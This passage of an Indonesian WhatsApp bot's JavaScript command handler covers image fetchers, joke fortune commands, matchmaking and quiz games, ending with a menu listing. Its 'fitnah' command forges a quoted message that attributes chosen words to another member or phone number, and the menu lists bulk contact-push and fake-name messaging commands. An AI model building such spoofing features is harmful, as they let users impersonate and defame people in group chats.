        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;
case 'cogan': {
    try {
        let anu = 'https://api.agungny.my.id/api/cogan';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE' 
        }, { quoted: fkontak1 });
    } catch (e) {
        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;
			case 'coffe': case 'kopi': {
				await Xlesy.sendFileUrl(m.chat, 'https://coffee.alexflipnote.dev/random', '☕ Random Coffe', m,
				{ quoted: fkontak1 })
			}
			break
			
			// Anime Menu
			
			case 'tanjiro': {
    let images = [
        'https://i.imgur.com/tanjiro1.jpg',
        'https://i.imgur.com/tanjiro2.jpg',
        'https://i.imgur.com/tanjiro3.jpg',
        'https://i.imgur.com/tanjiro4.jpg',
        'https://i.imgur.com/tanjiro5.jpg'
    ];

    let randomImage = images[Math.floor(Math.random() * images.length)];

    let message = {
        image: { url: randomImage },
        caption: "🔥 Tanjiro Kamado 🔥"
    };

    await Xlesy.sendMessage(m.chat, message, { quoted: fkontak1 });
    break;
}
			
			case 'waifu': {
				try {
					if (text == 'nsfw') {
						if (!isNsfw) return m.reply('Filter Nsfw Sedang Aktif!')
						const res = await fetchJson('https://api.waifu.pics/nsfw/waifu')
						await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					} else {
						const res = await fetchJson('https://api.waifu.pics/sfw/waifu')
						await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					}
				} catch (e) {
					m.reply('Server sedang offline!',
					{ quoted: fkontak1 })
				}
			}
			break
			case 'neko': {
				try {
					if (text == 'nsfw') {
						if (!isNsfw) return m.reply('Filter Nsfw Sedang Aktif!')
						const res = await fetchJson('https://api.waifu.pics/nsfw/neko')
						await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					} else {
						const res = await fetchJson('https://api.waifu.pics/sfw/neko')
						await Xlesy.sendFileUrl(m.chat, res.url, 'Random Neko', m)
					}
				} catch (e) {
					m.reply('Server sedang offline!',
					{ quoted: fkontak1 })
				}
			}
			break
			
			// Fun Menu
			case 'dadu': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				await Xlesy.sendAsSticker(m.chat, media.url, m, { packname: packname, author: author, isAvatar: 1 })
			}
			break
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': {
				if (!m.quoted && !text) return m.reply(`Kirim/reply text dengan caption ${prefix + command}`, { quoted: fkontak1 })
				ter = command[1].toLowerCase()
				tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
				m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
			}
			break
			case 'bisakah': {
				if (!text) return m.reply(`Example : ${prefix + command} saya menang?`, { quoted: fkontak1 })
				let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
				let keh = bisa[Math.floor(Math.random() * bisa.length)]
				m.reply(`*Bisakah ${text}*\nJawab : ${keh}`, { quoted: fkontak1 })
			}
			break
			case 'apakah': {
				if (!text) return m.reply(`Example : ${prefix + command} saya bisa menang?`, { quoted: fkontak1 })
				let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Mungkin Tidak','Mungkin Iya','Ntahlah']
				let kah = apa[Math.floor(Math.random() * apa.length)]
				m.reply(`*${command} ${text}*\nJawab : ${kah}`, { quoted: fkontak1 })
			}
			break
			case 'kapan': case 'kapankah': {
				if (!text) return m.reply(`Example : ${prefix + command} saya menang?`, { quoted: fkontak1 })
				let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Ntahlah','Tidak Akan Pernah']
				let koh = kapan[Math.floor(Math.random() * kapan.length)]
				m.reply(`*${command} ${text}*\nJawab : ${koh}`, { quoted: fkontak1 })
			}
			break
			case 'siapa': case 'siapakah': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!text) return m.reply(`Example : ${prefix + command} jawa?`, { quoted: fkontak1 })
				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
				let siapakh = pickRandom(member)
				m.reply(`@${siapakh.split('@')[0]}`, { quoted: fkontak1 });
			}
			break
			case 'tanyakerang': case 'kerangajaib': case 'kerang': {
				if (!text) return m.reply(`Example : ${prefix + command} boleh pinjam 100?`, { quoted: fkontak1 })
				let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
				let jwb = pickRandom(krng)
				m.reply(`*Pertanyaan : ${text}*\n*Jawab : ${jwb}*`, { quoted: fkontak1 })
			}
			break
			case 'cekmati': {
				if (!text) return m.reply(`Example : ${prefix + command} nama lu`, { quoted: fkontak1 })
				let teksnya = text.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, '').replace(/\d/g, '');
				let { data } = await axios.get(`https://api.agify.io/?name=${teksnya ? teksnya : 'bot'}`, { quoted: fkontak1 });
				m.reply(`Nama : ${text}\n*Mati Pada Umur :* ${data.age == null ? (Math.floor(Math.random() * 90) + 20) : data.age} Tahun.\n\n_Cepet Cepet Tobat Bro_\n_Soalnya Mati ga ada yang tau_`, { quoted: fkontak1 })
			}
			break
			case 'ceksifat': {
				let sifat_a = ['Bijak','Sabar','Kreatif','Humoris','Mudah bergaul','Mandiri','Setia','Jujur','Dermawan','Idealis','Adil','Sopan','Tekun','Rajin','Pemaaf','Murah hati','Ceria','Percaya diri','Penyayang','Disiplin','Optimis','Berani','Bersyukur','Bertanggung jawab','Bisa diandalkan','Tenang','Kalem','Logis']
				let sifat_b = ['Sombong','Minder','Pendendam','Sensitif','Perfeksionis','Caper','Pelit','Egois','Pesimis','Penyendiri','Manipulatif','Labil','Penakut','Vulgar','Tidak setia','Pemalas','Kasar','Rumit','Boros','Keras kepala','Tidak bijak','Pembelot','Serakah','Tamak','Penggosip','Rasis','Ceroboh','Intoleran']
				let teks = `╭──┈➤「 *Cek Sifat* 」❍\n│• Sifat ${text && m.mentionedJid ? text : '@' + m.sender.split('@')[0]}${(text && m.mentionedJid ? '' : (`\n│• Nama : *${text ? text : m.pushName}*` || '\n│• Nama : *Tanpa Nama*'))}\n│• Orang yang : *${pickRandom(sifat_a)}*\n│• Kekurangan : *${pickRandom(sifat_b)}*\n│• Keberanian : *${Math.floor(Math.random() * 100)}%*\n│• Kepedulian : *${Math.floor(Math.random() * 100)}%*\n│• Kecemasan : *${Math.floor(Math.random() * 100)}%*\n│• Ketakutan : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Baik : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Buruk : *${Math.floor(Math.random() * 100)}%*\n╰──────┈➤`
				m.reply(teks, { quoted: fkontak1 })
			}
			break
			case 'cekkhodam': {
				if (!text) return m.reply(`Example : ${prefix + command} nama lu`, { quoted: fkontak1 })
				try {
					const res = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/random/cekkhodam.json');
					const hasil = pickRandom(res);
					m.reply(`Khodam dari *${text}* adalah *${hasil.nama}*\n_${hasil.deskripsi}_`, { quoted: fkontak1 })
				} catch (e) {
					m.reply(pickRandom(['Dokter Indosiar','Sigit Rendang','Ustadz Sinetron','Bocil epep']), { quoted: fkontak1 })
				}
			}
			break
			case 'rate': case 'nilai': {
				m.reply(`Rate Bot : *${Math.floor(Math.random() * 100)}%*`, { quoted: fkontak1 })
			}
			break
			case 'jodohku': {
				if (!m.isGroup) return m.reply(mess.group)
				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
				let jodoh = pickRandom(member)
				m.reply(`👫Jodoh mu adalah\n@${m.sender.split('@')[0]} ❤ @${jodoh.split('@')[0]}`, { quoted: fkontak1 });
			}
			break
			case 'jadian': {
				if (!m.isGroup) return m.reply(mess.group)
				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
				let jadian1 = pickRandom(member)
				let jadian2 = pickRandom(member)
				m.reply(`Ciee yang Jadian💖 Jangan lupa Donasi🗿\n@${jadian1.split('@')[0]} ❤ @${jadian2.split('@')[0]}`, { quoted: fkontak1 });
			}
			break
			case 'fitnah': {
				let [teks1, teks2, teks3] = text.split`|`
				if (!teks1 || !teks2 || !teks3) return m.reply(`Example : ${prefix + command} pesan target|pesan mu|nomer/tag target`, { quoted: fkontak1 })
				let ftelo = { key: { fromMe: false, participant: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net', ...(m.isGroup ? { remoteJid: m.chat } : { remoteJid: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net'})}, message: { conversation: teks1 }}
				Xlesy.sendMessage(m.chat, { text: teks2 }, { quoted: ftelo });
			}
			break
			
			// Game Menu
			case 'slot': {
				await gameSlot(Xlesy, m, db)
			}
			break
			case 'casino': {
				await gameCasinoSolo(Xlesy, m, prefix, db)
			}
			break
			case 'rampok': case 'merampok': {
				await gameMerampok(m, db)
			}
			break
			case 'begal': {
				await gameBegal(Xlesy, m, db)
			}
			break
			case 'suitpvp': case 'suit': {
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`, { quoted: fkontak1 })
				if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`, { quoted: fkontak1 })
				if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] }, { quoted: fkontak1 })
				if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`, { quoted: fkontak1 })
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit\n\nSilahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
				suit[id] = {
				//tanda1
					chat: m.reply(caption, { quoted: fkontak1 }),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (suit[id]) m.reply(`_Waktu suit habis_`, { quoted: fkontak1 })
						delete suit[id]
					}, 60000), poin, poin_lose, timeout
				}
			}
			break
			case 'ttc': case 'ttt': case 'tictactoe': {
				let TicTacToe = require('./lib/tictactoe');
				if (Object.values(tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`Kamu masih didalam game!\nKetik *${prefix}del${command}* Jika Ingin Mengakhiri sesi`, { quoted: fkontak1 });
				let room = Object.values(tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					m.reply('Partner ditemukan!', { quoted: fkontak1 })
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {X: '❌',O: '⭕',1: '1️⃣',2: '2️⃣',3: '3️⃣',4: '4️⃣',5: '5️⃣',6: '6️⃣',7: '7️⃣',8: '8️⃣',9: '9️⃣'}[v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nMenunggu @${room.game.currentTurn.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
					if (room.x !== room.o) await Xlesy.sendMessage(room.x, { texr: str, mentions: parseMention(str) }, { quoted: fkontak1 })
					await Xlesy.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: fkontak1 })
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
						waktu: setTimeout(() => {
							if (tictactoe[roomnya.id]) m.reply(`_Waktu ${command} habis_`, { quoted: fkontak1 })
							delete tictactoe[roomnya.id]
						}, 300000)
					}
					if (text) room.name = text
					Xlesy.sendMessage(m.chat, { text: 'Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''), mentions: m.mentionedJid }, { quoted: fkontak1 })
					tictactoe[room.id] = room
				}
			}
			break
			case 'akinator': {
				if (text == 'start') {
					if (akinator[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
					akinator[m.sender] = new Akinator({ region: 'id', childMode: false });
					await akinator[m.sender].start()
					let { key } = await m.reply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]}\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n\n${prefix + command} end (Untuk Keluar dari sesi)`, { quoted: fkontak1 })
					akinator[m.sender].key = key.id
					akinator[m.sender].waktu = setTimeout(() => {
						if (akinator[m.sender]) m.reply(`_Waktu ${command} habis_`, { quoted: fkontak1 })
						delete akinator[m.sender];
					}, 3600000)
				} else if (text == 'end') {
					if (!akinator[m.sender]) return m.reply('Kamu tidak Sedang bermain Akinator!')
					delete akinator[m.sender];
					m.reply('Sukses Mengakhiri sessi Akinator')
				} else m.reply(`Example : ${prefix + command} start/end`, { quoted: fkontak1 })
			}
			break
			case 'tebakbom': {
				if (tebakbom[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				tebakbom[m.sender] = {
					petak: [0, 0, 0, 2, 0, 2, 0, 2, 0, 0].sort(() => Math.random() - 0.5),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (tebakbom[m.sender]) m.reply(`_Waktu ${command} habis_`, { quoted: fkontak1 })
						delete tebakbom[m.sender];
					}, 120000)
				}
				m.reply(`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${tebakbom[m.sender].bomb}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`,
				{ quoted: fkontak1 });
			}
			break
			case 'tekateki': {
				if (iGame(tekateki, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tekateki.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Teka Teki Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`, { quoted: fkontak1 })
				tekateki[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tekateki, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tekateki[m.chat + key.id].jawaban)
					delete tekateki[m.chat + key.id]
				}
			}
			break
			case 'tebaklirik': {
				if (iGame(tebaklirik, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebaklirik.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Lirik Berikut :\n\n${hasil.soal}\n\nWaktu : 90s\nHadiah *+4299*`, { quoted: fkontak1 })
				tebaklirik[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(90000)
				if (rdGame(tebaklirik, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebaklirik[m.chat + key.id].jawaban)
					delete tebaklirik[m.chat + key.id]
				}
			}
			break
			case 'tebakkata': {
				if (iGame(tebakkata, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakkata.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`, { quoted: fkontak1 })
				tebakkata[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakkata, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakkata[m.chat + key.id].jawaban)
					delete tebakkata[m.chat + key.id]
				}
			}
			break
			case 'family100': {
				if (family100.hasOwnProperty(m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/family100.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 5m\nHadiah *+3499*`, { quoted: fkontak1 })
				family100[m.chat] = {
					soal: hasil.soal,
					jawaban: hasil.jawaban,
					terjawab: Array.from(hasil.jawaban, () => false),
					id: key.id
				}
				await sleep(300000)
				if (family100.hasOwnProperty(m.chat)) {
					m.reply('Waktu Habis\nJawaban:\n- ' + family100[m.chat].jawaban.join('\n- '))
					delete family100[m.chat]
				}
			}
			break
			case 'susunkata': {
				if (iGame(susunkata, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/susunkata.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Susun Kata Berikut :\n\n${hasil.soal}\nTipe : ${hasil.tipe}\n\nWaktu : 60s\nHadiah *+2989*`, { quoted: fkontak1 })
				susunkata[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(susunkata, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + susunkata[m.chat + key.id].jawaban)
					delete susunkata[m.chat + key.id]
				}
			}
			break
			case 'tebakkimia': {
				if (iGame(tebakkimia, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakkimia.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Kimia Berikut :\n\n${hasil.unsur}\n\nWaktu : 60s\nHadiah *+3499*`, { quoted: fkontak1 })
				tebakkimia[m.chat + key.id] = {
					jawaban: hasil.lambang.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakkimia, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakkimia[m.chat + key.id].jawaban)
					delete tebakkimia[m.chat + key.id]
				}
			}
			break
			case 'caklontong': {
				if (iGame(caklontong, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/caklontong.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Jawab Pertanyaan Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+9999*`, { quoted: fkontak1 })
				caklontong[m.chat + key.id] = {
					...hasil,
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(caklontong, m.chat, key.id)) {
					m.reply(`Waktu Habis\nJawaban: ${caklontong[m.chat + key.id].jawaban}\n"${caklontong[m.chat + key.id].deskripsi}"`, { quoted: fkontak1 })
					delete caklontong[m.chat + key.id]
				}
			}
			break
			case 'tebaknegara': {
				if (iGame(tebaknegara, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebaknegara.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Negara Dari Tempat Berikut :\n\n*Tempat : ${hasil.tempat}*\n\nWaktu : 60s\nHadiah *+3499*`, { quoted: fkontak1 })
				tebaknegara[m.chat + key.id] = {
					jawaban: hasil.negara.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebaknegara, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebaknegara[m.chat + key.id].jawaban)
					delete tebaknegara[m.chat + key.id]
				}
			}
			break
			case 'tebakgambar': {
				if (iGame(tebakgambar, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakgambar.json');
				const hasil = pickRandom(soal);
				let { key } = await Xlesy.sendFileUrl(m.chat, hasil.img, `🎮 Tebak Gambar Berikut :\n\n${hasil.deskripsi}\n\nWaktu : 60s\nHadiah *+3499*`, m)
				tebakgambar[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakgambar, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakgambar[m.chat + key.id].jawaban)
					delete tebakgambar[m.chat + key.id]
				}
			}
			break
			case 'tebakbendera': {
				if (iGame(tebakbendera, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakbendera.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Bendera Berikut :\n\n*Bendera : ${hasil.bendera}*\n\nWaktu : 60s\nHadiah *+3499*`, { quoted: fkontak1 })
				tebakbendera[m.chat + key.id] = {
					jawaban: hasil.negara.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakbendera, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakbendera[m.chat + key.id].jawaban)
					delete tebakbendera[m.chat + key.id]
				}
			}
			break
			case 'tebakangka': case 'butawarna': case 'colorblind': {
				if (iGame(tebakangka, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/random/color_blind.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply({
					text: `Pilih Jawaban Yang Benar!\nPilihan: ${[hasil.number, ...hasil.similar].sort(() => Math.random() - 0.5).join(', ')}`,
					contextInfo: {
						externalAdReply: {
							renderLargerThumbnail: true,
							thumbnailUrl: hasil.color_blind[0],
							body: `Level : ${hasil.lv}`,
							previewType: 0,
							mediaType: 1,
						}
					}
				});
				tebakangka[m.chat + key.id] = {
					jawaban: hasil.number,
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakangka, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakangka[m.chat + key.id].jawaban)
					delete tebakangka[m.chat + key.id]
				}
			}
			break
			case 'kuismath': case 'math': {
				const { genMath, modes } = require('./lib/math');
				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
				if (iGame(kuismath, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`, { quoted: fkontak1 })
				if (!inputMode.includes(text.toLowerCase())) return m.reply('Mode tidak ditemukan!')
				let result = await genMath(text.toLowerCase())
				let { key } = await m.reply(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu : ${(result.waktu / 1000).toFixed(2)} detik`, { quoted: fkontak1 })
				kuismath[m.chat + key.id] = {
					jawaban: result.jawaban,
					mode: text.toLowerCase(),
					id: key.id
				}
				await sleep(kuismath, result.waktu)
				if (rdGame(m.chat + key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + kuismath[m.chat + key.id].jawaban)
					delete kuismath[m.chat + key.id]
				}
			}
			break
			
			// Menu
			case 'allmenu': {
			    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
				let profile
				try {
					profile = await Xlesy.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim
				}
				const menunya = `
  ❍───❍「 \`ALLMENU\`📚 」❍───❍
				
╭──────┈➤「 *\`BOT\`* 」❍
│ ${setv} ${prefix}claim
│ ${setv} ${prefix}buy [item] (nominal)
│ ${setv} ${prefix}transfer
│ ${setv} ${prefix}leaderboard
│ ${setv} ${prefix}request (text)
│ ${setv} ${prefix}react (emoji)
│ ${setv} ${prefix}tagme
│ ${setv} ${prefix}runtime
│ ${setv} ${prefix}totalfitur
│ ${setv} ${prefix}ping
│ ${setv} ${prefix}afk
│ ${setv} ${prefix}rvo (reply pesan viewone)
│ ${setv} ${prefix}inspect (url gc)
│ ${setv} ${prefix}addmsg
│ ${setv} ${prefix}delmsg
│ ${setv} ${prefix}getmsg
│ ${setv} ${prefix}listmsg
│ ${setv} ${prefix}q (reply pesan)
│ ${setv} ${prefix}menfes (62xxx|fake name)
│ ${setv} ${prefix}jadibot
│ ${setv} ${prefix}stopjadibot
│ ${setv} ${prefix}listjadibot
│ ${setv} ${prefix}jasajadibot
│ ${setv} ${prefix}sewa
│ ${setv} ${prefix}donasi
│ ${setv} ${prefix}pay
│ ${setv} ${prefix}apkytprem
╰─┬────┈➤
╭─┴─┈➤「 *\`GROUP\`* 」❍
│ ${setv} ${prefix}add (62xxx)
│ ${setv} ${prefix}kick (@tag/62xxx)
│ ${setv} ${prefix}promote (@tag/62xxx)
│ ${setv} ${prefix}demote (@tag/62xxx)
│ ${setv} ${prefix}setname (nama baru gc)
│ ${setv} ${prefix}setdesc (desk)
│ ${setv} ${prefix}setppgc (reply imgnya)
│ ${setv} ${prefix}delete (reply pesan)
│ ${setv} ${prefix}linkgrup
│ ${setv} ${prefix}revoke
│ ${setv} ${prefix}tagall
│ ${setv} ${prefix}hidetag
│ ${setv} ${prefix}totag (reply pesan)
│ ${setv} ${prefix}listonline
│ ${setv} ${prefix}group set
╰─┬────┈➤
╭─┴─┈➤「 *\`SEARCH\`* 」❍
│ ${setv} ${prefix}ytsearch (query)
│ ${setv} ${prefix}pixiv (query)
│ ${setv} ${prefix}pinterest (query)
│ ${setv} ${prefix}wallpaper (query)
│ ${setv} ${prefix}ringtone (query)
│ ${setv} ${prefix}google (query)
│ ${setv} ${prefix}gimage (query)
│ ${setv} ${prefix}npm (query)
│ ${setv} ${prefix}style (query)
│ ${setv} ${prefix}ig (url akun ig)
│ ${setv} ${prefix}searchgroup (nama_gc)
│ ${setv} ${prefix}waktudunia
│ ${setv} ${prefix}cuaca (kota)
│ ${setv} ${prefix}animecari
│ ${setv} ${prefix}mlnews
╰─┬────┈➤
╭─┴─┈➤「 *\`DOWNLOAD\`* 」❍
│ ${setv} ${prefix}ytmp3 (url)
│ ${setv} ${prefix}ytmp4 (url)
│ ${setv} ${prefix}instagram (url)
│ ${setv} ${prefix}tiktok (url)
│ ${setv} ${prefix}facebook (url)
│ ${setv} ${prefix}spotifydl (url)
│ ${setv} ${prefix}mediafire (url)
╰─┬────┈➤
╭─┴┈➤「 *\`PUSH\`* 」❍
│ ${setv} ${prefix}pushkontak
│ ${setv} ${prefix}pushkontak  
│ ${setv} ${prefix}pushkontakid    
│ ${setv} ${prefix}jpm
│ ${setv} ${prefix}setteksjpm
│ ${setv} ${prefix}teksjpm
│ ${setv} ${prefix}svkontak (nama kontak)
╰─┬──┈➤
╭─┴─┈➤「 *\`QUOTES\`* 」❍
│ ${setv} ${prefix}motivasi
│ ${setv} ${prefix}quotes
│ ${setv} ${prefix}quotesislamic
│ ${setv} ${prefix}quotessad
│ ${setv} ${prefix}truth
│ ${setv} ${prefix}renungan
╰─┬────┈➤
╭─┴┈➤「 *LIBRAY MENU* 」❍    
│ ${setv} ${prefix}cerpen-anak  
│ ${setv} ${prefix}cerpen-bahasadaerah  
│ ${setv} ${prefix}cerpen-bahasainggris  
│ ${setv} ${prefix}cerpen-bahasajawa  
│ ${setv} ${prefix}cerpen-bahasasunda  
│ ${setv} ${prefix}cerpen-budaya  
│ ${setv} ${prefix}cerpen-cinta  
│ ${setv} ${prefix}cerpen-cintaislami  
│ ${setv} ${prefix}cerpen-cintapertama  
│ ${setv} ${prefix}cerpen-cintaromantis  
│ ${setv} ${prefix}cerpen-cintasedih  
│ ${setv} ${prefix}cerpen-cintasegitiga  
│ ${setv} ${prefix}cerpen-cintasejati  
│ ${setv} ${prefix}cerpen-galau  
